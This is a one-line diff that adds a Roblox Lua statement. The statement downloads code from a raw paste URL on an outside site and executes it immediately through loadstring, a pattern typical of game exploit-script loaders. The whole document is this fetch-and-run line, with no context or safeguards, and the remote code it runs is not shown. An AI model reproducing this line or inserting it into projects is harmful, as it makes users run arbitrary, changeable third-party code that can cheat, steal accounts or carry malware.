@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://www.klgrth.io/paste/ehttz/raw"), true))()
